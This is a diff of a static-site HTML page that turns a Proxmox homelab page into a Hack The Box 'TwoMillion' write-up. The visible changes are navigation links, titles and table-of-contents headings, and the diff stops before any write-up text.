@@ -6,7 +6,7 @@
       <meta charset="utf-8">
       <meta name="viewport" content="width=device-width,initial-scale=1">
       
-        <meta name="description" content="The machine that carries my entire lab on its back.">
+        <meta name="description" content="An old HTB platform clone — hack the invite code, abuse the API, escape through a kernel CVE.">
       
       
         <meta name="author" content="Fudomaru">
@@ -16,25 +16,25 @@
         <link rel="prev" href="../overview/">
       
       
-        <link rel="next" href="../pfsense/">
+        <link rel="next" href="../../thm/overview/">
       
       
         
       
       
-      <link rel="icon" href="../../assets/images/favicon.png">
+      <link rel="icon" href="../../../assets/images/favicon.png">
       <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.5">
     
     
       
-        <title>Proxmox Hypervisor - Digital Dojo</title>
+        <title>TwoMillion - Digital Dojo</title>
       
     
     
-      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.484c7ddc.min.css">
       
         
-        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.ab4e12ef.min.css">
       
       
   
@@ -118,7 +118,7 @@
       
     
     
-    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
     
       
 
@@ -143,7 +143,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#proxmox-hypervisor" class="md-skip">
+        <a href="#twomillion" class="md-skip">
           Skip to content
         </a>
       
@@ -157,9 +157,9 @@
 
 <header class="md-header" data-md-component="header">
   <nav class="md-header__inner md-grid" aria-label="Header">
-    <a href="../.." title="Digital Dojo" class="md-header__button md-logo" aria-label="Digital Dojo" data-md-component="logo">
+    <a href="../../.." title="Digital Dojo" class="md-header__button md-logo" aria-label="Digital Dojo" data-md-component="logo">
       
-  <img src="../../assets/Logonew.png" alt="logo">
+  <img src="../../../assets/Logonew.png" alt="logo">
 
     </a>
     <label class="md-header__button md-icon" for="__drawer">
@@ -176,7 +176,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Proxmox Hypervisor
+              TwoMillion
             
           </span>
         </div>
@@ -279,7 +279,7 @@
   
   
     <li class="md-tabs__item">
-      <a href="../.." class="md-tabs__link">
+      <a href="../../.." class="md-tabs__link">
         
   
   
@@ -300,7 +300,7 @@
     
     
       <li class="md-tabs__item">
-        <a href="../../foundations/overview/" class="md-tabs__link">
+        <a href="../../../foundations/overview/" class="md-tabs__link">
           
   
   
@@ -320,11 +320,31 @@
     
     
       <li class="md-tabs__item">
-        <a href="../../security/overview/" class="md-tabs__link">
+        <a href="../../../security/overview/" class="md-tabs__link">
           
   
   
   Security
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../homelab/overview/" class="md-tabs__link">
+          
+  
+  
+  Homelab
 
         </a>
       </li>
@@ -342,27 +362,7 @@
     
     
       <li class="md-tabs__item md-tabs__item--active">
-        <a href="../overview/" class="md-tabs__link">
-          
-  
-  
-  Homelab
-
-        </a>
-      </li>
-    
-  
-
-      
-        
-  
-  
-  
-  
-    
-    
-      <li class="md-tabs__item">
-        <a href="../../challenges/overview/" class="md-tabs__link">
+        <a href="../../overview/" class="md-tabs__link">
           
   
   
@@ -382,7 +382,7 @@
     
     
       <li class="md-tabs__item">
-        <a href="../../projects/overview/" class="md-tabs__link">
+        <a href="../../../projects/overview/" class="md-tabs__link">
           
   
   
@@ -402,7 +402,7 @@
     
     
       <li class="md-tabs__item">
-        <a href="../../notes/overview/" class="md-tabs__link">
+        <a href="../../../notes/overview/" class="md-tabs__link">
           
   
   
@@ -420,7 +420,7 @@
   
   
     <li class="md-tabs__item">
-      <a href="../../about/" class="md-tabs__link">
+      <a href="../../../about/" class="md-tabs__link">
         
   
   
@@ -455,9 +455,9 @@
 
 <nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
   <label class="md-nav__title" for="__drawer">
-    <a href="../.." title="Digital Dojo" class="md-nav__button md-logo" aria-label="Digital Dojo" data-md-component="logo">
+    <a href="../../.." title="Digital Dojo" class="md-nav__button md-logo" aria-label="Digital Dojo" data-md-component="logo">
       
-  <img src="../../assets/Logonew.png" alt="logo">
+  <img src="../../../assets/Logonew.png" alt="logo">
 
     </a>
     Digital Dojo
@@ -484,7 +484,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../.." class="md-nav__link">
+      <a href="../../.." class="md-nav__link">
         
   
   
@@ -561,7 +561,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../foundations/overview/" class="md-nav__link">
+      <a href="../../../foundations/overview/" class="md-nav__link">
         
   
   
@@ -589,7 +589,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../foundations/networking/" class="md-nav__link">
+      <a href="../../../foundations/networking/" class="md-nav__link">
         
   
   
@@ -667,7 +667,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../foundations/windows/overview/" class="md-nav__link">
+      <a href="../../../foundations/windows/overview/" class="md-nav__link">
         
   
   
@@ -695,7 +695,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../foundations/windows/uefi/" class="md-nav__link">
+      <a href="../../../foundations/windows/uefi/" class="md-nav__link">
         
   
   
@@ -723,7 +723,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../foundations/windows/eventviewer/" class="md-nav__link">
+      <a href="../../../foundations/windows/eventviewer/" class="md-nav__link">
         
   
   
@@ -751,7 +751,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../foundations/windows/winregistry/" class="md-nav__link">
+      <a href="../../../foundations/windows/winregistry/" class="md-nav__link">
         
   
   
@@ -779,7 +779,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../foundations/windows/cli-magic/" class="md-nav__link">
+      <a href="../../../foundations/windows/cli-magic/" class="md-nav__link">
         
   
   
@@ -865,7 +865,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../foundations/macos/overview/" class="md-nav__link">
+      <a href="../../../foundations/macos/overview/" class="md-nav__link">
         
   
   
@@ -951,7 +951,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../foundations/linux/overview/" class="md-nav__link">
+      <a href="../../../foundations/linux/overview/" class="md-nav__link">
         
   
   
@@ -979,7 +979,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../foundations/linux/cli-magic/" class="md-nav__link">
+      <a href="../../../foundations/linux/cli-magic/" class="md-nav__link">
         
   
   
@@ -1007,7 +1007,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../foundations/linux/system-internals/" class="md-nav__link">
+      <a href="../../../foundations/linux/system-internals/" class="md-nav__link">
         
   
   
@@ -1093,7 +1093,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../foundations/protocols/overview/" class="md-nav__link">
+      <a href="../../../foundations/protocols/overview/" class="md-nav__link">
         
   
   
@@ -1121,7 +1121,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../foundations/protocols/arp/" class="md-nav__link">
+      <a href="../../../foundations/protocols/arp/" class="md-nav__link">
         
   
   
@@ -1149,7 +1149,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../foundations/protocols/ip/" class="md-nav__link">
+      <a href="../../../foundations/protocols/ip/" class="md-nav__link">
         
   
   
@@ -1177,7 +1177,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../foundations/protocols/icmp/" class="md-nav__link">
+      <a href="../../../foundations/protocols/icmp/" class="md-nav__link">
         
   
   
@@ -1205,7 +1205,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../foundations/protocols/tcp/" class="md-nav__link">
+      <a href="../../../foundations/protocols/tcp/" class="md-nav__link">
         
   
   
@@ -1233,7 +1233,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../foundations/protocols/udp/" class="md-nav__link">
+      <a href="../../../foundations/protocols/udp/" class="md-nav__link">
         
   
   
@@ -1261,7 +1261,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../foundations/protocols/tls/" class="md-nav__link">
+      <a href="../../../foundations/protocols/tls/" class="md-nav__link">
         
   
   
@@ -1289,7 +1289,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../foundations/protocols/dns/" class="md-nav__link">
+      <a href="../../../foundations/protocols/dns/" class="md-nav__link">
         
   
   
@@ -1317,7 +1317,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../foundations/protocols/smtp/" class="md-nav__link">
+      <a href="../../../foundations/protocols/smtp/" class="md-nav__link">
         
   
   
@@ -1345,7 +1345,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../foundations/protocols/snmp/" class="md-nav__link">
+      <a href="../../../foundations/protocols/snmp/" class="md-nav__link">
         
   
   
@@ -1373,7 +1373,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../foundations/protocols/ftp/" class="md-nav__link">
+      <a href="../../../foundations/protocols/ftp/" class="md-nav__link">
         
   
   
@@ -1401,7 +1401,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../foundations/protocols/ssh/" class="md-nav__link">
+      <a href="../../../foundations/protocols/ssh/" class="md-nav__link">
         
   
   
@@ -1429,7 +1429,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../foundations/protocols/smb/" class="md-nav__link">
+      <a href="../../../foundations/protocols/smb/" class="md-nav__link">
         
   
   
@@ -1457,7 +1457,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../foundations/protocols/dhcp/" class="md-nav__link">
+      <a href="../../../foundations/protocols/dhcp/" class="md-nav__link">
         
   
   
@@ -1485,7 +1485,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../foundations/protocols/http/" class="md-nav__link">
+      <a href="../../../foundations/protocols/http/" class="md-nav__link">
         
   
   
@@ -1513,7 +1513,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../foundations/protocols/netbios/" class="md-nav__link">
+      <a href="../../../foundations/protocols/netbios/" class="md-nav__link">
         
   
   
@@ -1606,7 +1606,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../security/overview/" class="md-nav__link">
+      <a href="../../../security/overview/" class="md-nav__link">
         
   
   
@@ -1634,7 +1634,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../security/fundamentals/" class="md-nav__link">
+      <a href="../../../security/fundamentals/" class="md-nav__link">
         
   
   
@@ -1712,7 +1712,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../security/pentesting/fundamentals/" class="md-nav__link">
+      <a href="../../../security/pentesting/fundamentals/" class="md-nav__link">
         
   
   
@@ -1740,7 +1740,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../security/pentesting/types/" class="md-nav__link">
+      <a href="../../../security/pentesting/types/" class="md-nav__link">
         
   
   
@@ -1768,7 +1768,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../security/pentesting/structure/" class="md-nav__link">
+      <a href="../../../security/pentesting/structure/" class="md-nav__link">
         
   
   
@@ -1796,7 +1796,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../security/pentesting/skills/" class="md-nav__link">
+      <a href="../../../security/pentesting/skills/" class="md-nav__link">
         
   
   
@@ -1824,7 +1824,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../security/pentesting/methodologies/" class="md-nav__link">
+      <a href="../../../security/pentesting/methodologies/" class="md-nav__link">
         
   
   
@@ -1910,7 +1910,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../security/exploits/overview/" class="md-nav__link">
+      <a href="../../../security/exploits/overview/" class="md-nav__link">
         
   
   
@@ -1938,7 +1938,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../security/exploits/xss/" class="md-nav__link">
+      <a href="../../../security/exploits/xss/" class="md-nav__link">
         
   
   
@@ -1966,7 +1966,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../security/exploits/hardcoded_secrets/" class="md-nav__link">
+      <a href="../../../security/exploits/hardcoded_secrets/" class="md-nav__link">
         
   
   
@@ -1994,7 +1994,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../security/exploits/idor/" class="md-nav__link">
+      <a href="../../../security/exploits/idor/" class="md-nav__link">
         
   
   
@@ -2022,7 +2022,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../security/exploits/ssrf/" class="md-nav__link">
+      <a href="../../../security/exploits/ssrf/" class="md-nav__link">
         
   
   
@@ -2050,7 +2050,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../security/exploits/sqli/" class="md-nav__link">
+      <a href="../../../security/exploits/sqli/" class="md-nav__link">
         
   
   
@@ -2078,7 +2078,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../security/exploits/missing_authorization/" class="md-nav__link">
+      <a href="../../../security/exploits/missing_authorization/" class="md-nav__link">
         
   
   
@@ -2114,7 +2114,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../security/privilege-escalation/" class="md-nav__link">
+      <a href="../../../security/privilege-escalation/" class="md-nav__link">
         
   
   
@@ -2192,7 +2192,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../security/toolbelt/overview/" class="md-nav__link">
+      <a href="../../../security/toolbelt/overview/" class="md-nav__link">
         
   
   
@@ -2220,7 +2220,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../security/toolbelt/nmap/" class="md-nav__link">
+      <a href="../../../security/toolbelt/nmap/" class="md-nav__link">
         
   
   
@@ -2248,7 +2248,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../security/toolbelt/searchsploit/" class="md-nav__link">
+      <a href="../../../security/toolbelt/searchsploit/" class="md-nav__link">
         
   
   
@@ -2276,7 +2276,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../security/toolbelt/schtasks/" class="md-nav__link">
+      <a href="../../../security/toolbelt/schtasks/" class="md-nav__link">
         
   
   
@@ -2304,7 +2304,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../security/toolbelt/metasploit/" class="md-nav__link">
+      <a href="../../../security/toolbelt/metasploit/" class="md-nav__link">
         
   
   
@@ -2390,7 +2390,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../security/playbooks/overview/" class="md-nav__link">
+      <a href="../../../security/playbooks/overview/" class="md-nav__link">
         
   
   
@@ -2418,7 +2418,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../security/playbooks/recon/" class="md-nav__link">
+      <a href="../../../security/playbooks/recon/" class="md-nav__link">
         
   
   
@@ -2446,7 +2446,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../security/playbooks/js-deobfuscation/" class="md-nav__link">
+      <a href="../../../security/playbooks/js-deobfuscation/" class="md-nav__link">
         
   
   
@@ -2486,29 +2486,24 @@
       
   
   
-    
   
   
-  
     
     
     
     
       
-        
-        
-      
       
     
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" checked>
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
         
           
-          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="">
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
             
   
   
@@ -2526,7 +2521,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="true">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
           <label class="md-nav__title" for="__nav_4">
             <span class="md-nav__icon md-icon"></span>
             
@@ -2544,7 +2539,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../overview/" class="md-nav__link">
+      <a href="../../../homelab/overview/" class="md-nav__link">
         
   
   
@@ -2569,37 +2564,10 @@
                 
   
   
-    
   
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-        
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          
-  
-  
-  <span class="md-ellipsis">
-    
-  
-    Proxmox
-  
-
-    
-  </span>
-  
-  
-
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../../../homelab/proxmox/" class="md-nav__link">
         
   
   
@@ -2615,81 +2583,6 @@
   
 
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
-  
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      Table of contents
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#why-proxmox" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Why Proxmox?
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#hardware" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Hardware
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#networking" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Networking
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#administration" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Administration
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#reflections" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Reflections
-      
-    </span>
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -2702,7 +2595,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../pfsense/" class="md-nav__link">
+      <a href="../../../homelab/pfsense/" class="md-nav__link">
         
   
   
@@ -2730,7 +2623,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../pihole/" class="md-nav__link">
+      <a href="../../../homelab/pihole/" class="md-nav__link">
         
   
   
@@ -2758,7 +2651,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../nginx/" class="md-nav__link">
+      <a href="../../../homelab/nginx/" class="md-nav__link">
         
   
   
@@ -2786,7 +2679,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../paperless-ngx/" class="md-nav__link">
+      <a href="../../../homelab/paperless-ngx/" class="md-nav__link">
         
   
   
@@ -2814,7 +2707,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../gitea/" class="md-nav__link">
+      <a href="../../../homelab/gitea/" class="md-nav__link">
         
   
   
@@ -2842,7 +2735,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../backups/" class="md-nav__link">
+      <a href="../../../homelab/backups/" class="md-nav__link">
         
   
   
@@ -2874,24 +2767,29 @@
       
   
   
+    
   
   
+  
     
     
     
     
-      
-      
-    
-    
-    <li class="md-nav__item md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" checked>
         
           
-          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="">
             
   
   
@@ -2909,7 +2807,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="true">
           <label class="md-nav__title" for="__nav_5">
             <span class="md-nav__icon md-icon"></span>
             
@@ -2927,7 +2825,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../challenges/overview/" class="md-nav__link">
+      <a href="../../overview/" class="md-nav__link">
         
   
   
@@ -3005,7 +2903,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../challenges/overthewire/bandit/" class="md-nav__link">
+      <a href="../../overthewire/bandit/" class="md-nav__link">
         
   
   
@@ -3033,7 +2931,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../challenges/overthewire/natas/" class="md-nav__link">
+      <a href="../../overthewire/natas/" class="md-nav__link">
         
   
   
@@ -3066,6 +2964,8 @@
                 
   
   
+    
+  
   
   
     
@@ -3076,11 +2976,11 @@
       
     
     
-    <li class="md-nav__item md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_3" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_3" checked>
         
           
           <label class="md-nav__link" for="__nav_5_3" id="__nav_5_3_label" tabindex="0">
@@ -3101,7 +3001,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_3_label" aria-expanded="false">
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_3_label" aria-expanded="true">
           <label class="md-nav__title" for="__nav_5_3">
             <span class="md-nav__icon md-icon"></span>
             
@@ -3119,7 +3019,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../challenges/htb/overview/" class="md-nav__link">
+      <a href="../overview/" class="md-nav__link">
         
   
   
@@ -3144,10 +3044,37 @@
                 
   
   
+    
   
   
-    <li class="md-nav__item">
-      <a href="../../challenges/htb/twomillion/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    TwoMillion
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         
   
   
@@ -3163,6 +3090,131 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#setup" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Setup
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Enumeration
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#mtu-troubleshooting" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        MTU Troubleshooting
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#the-website" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        The Website
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#hacking-the-invite-code" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Hacking the Invite Code
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#api-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        API Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privilege-escalation-to-admin" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Privilege Escalation to Admin
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#foothold-command-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Foothold — Command Injection
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#lateral-movement-www-data-to-admin" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Lateral Movement — www-data to admin
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -3233,7 +3285,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../challenges/thm/overview/" class="md-nav__link">
+      <a href="../../thm/overview/" class="md-nav__link">
         
   
   
@@ -3261,7 +3313,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../challenges/thm/billing/" class="md-nav__link">
+      <a href="../../thm/billing/" class="md-nav__link">
         
   
   
@@ -3354,7 +3406,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../projects/overview/" class="md-nav__link">
+      <a href="../../../projects/overview/" class="md-nav__link">
         
   
   
@@ -3432,7 +3484,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../projects/digital-dojo/overview/" class="md-nav__link">
+      <a href="../../../projects/digital-dojo/overview/" class="md-nav__link">
         
   
   
@@ -3460,7 +3512,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../projects/digital-dojo/01-powershell-autodeploy/" class="md-nav__link">
+      <a href="../../../projects/digital-dojo/01-powershell-autodeploy/" class="md-nav__link">
         
   
   
@@ -3488,7 +3540,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../projects/digital-dojo/02-scripting-upgrade/" class="md-nav__link">
+      <a href="../../../projects/digital-dojo/02-scripting-upgrade/" class="md-nav__link">
         
   
   
@@ -3524,7 +3576,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../projects/echosnare/" class="md-nav__link">
+      <a href="../../../projects/echosnare/" class="md-nav__link">
         
   
   
@@ -3552,7 +3604,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../projects/void_linux/" class="md-nav__link">
+      <a href="../../../projects/void_linux/" class="md-nav__link">
         
   
   
@@ -3637,7 +3689,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../notes/overview/" class="md-nav__link">
+      <a href="../../../notes/overview/" class="md-nav__link">
         
   
   
@@ -3665,7 +3717,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../notes/ccna/" class="md-nav__link">
+      <a href="../../../notes/ccna/" class="md-nav__link">
         
   
   
@@ -3743,7 +3795,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../notes/media/overview/" class="md-nav__link">
+      <a href="../../../notes/media/overview/" class="md-nav__link">
         
   
   
@@ -3771,7 +3823,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../notes/media/how-to-talk-to-anyone/" class="md-nav__link">
+      <a href="../../../notes/media/how-to-talk-to-anyone/" class="md-nav__link">
         
   
   
@@ -3799,7 +3851,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../notes/media/algorithms-to-live-by/" class="md-nav__link">
+      <a href="../../../notes/media/algorithms-to-live-by/" class="md-nav__link">
         
   
   
@@ -3827,7 +3879,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../notes/media/12-rules-for-life/" class="md-nav__link">
+      <a href="../../../notes/media/12-rules-for-life/" class="md-nav__link">
         
   
   
@@ -3863,7 +3915,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../notes/warboard/" class="md-nav__link">
+      <a href="../../../notes/warboard/" class="md-nav__link">
         
   
   
@@ -3941,7 +3993,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../notes/unfinished/bash-course-ysap/" class="md-nav__link">
+      <a href="../../../notes/unfinished/bash-course-ysap/" class="md-nav__link">
         
   
   
@@ -3969,7 +4021,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../notes/unfinished/footprinting/" class="md-nav__link">
+      <a href="../../../notes/unfinished/footprinting/" class="md-nav__link">
         
   
   
@@ -4012,7 +4064,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../about/" class="md-nav__link">
+      <a href="../../../about/" class="md-nav__link">
         
   
   
@@ -4059,10 +4111,10 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#why-proxmox" class="md-nav__link">
+  <a href="#setup" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Why Proxmox?
+        Setup
       
     </span>
   </a>
@@ -4070,10 +4122,38 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#hardware" class="md-nav__link">
+  <a href="#enumeration" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Hardware
+        Enumeration
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#mtu-troubleshooting" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        MTU Troubleshooting
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#the-website" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        The Website
       
     </span>
   </a>
@@ -4081,10 +4161,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#networking" class="md-nav__link">
+  <a href="#hacking-the-invite-code" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Networking
+        Hacking the Invite Code
       
     </span>
   </a>
@@ -4092,10 +4172,10 @@
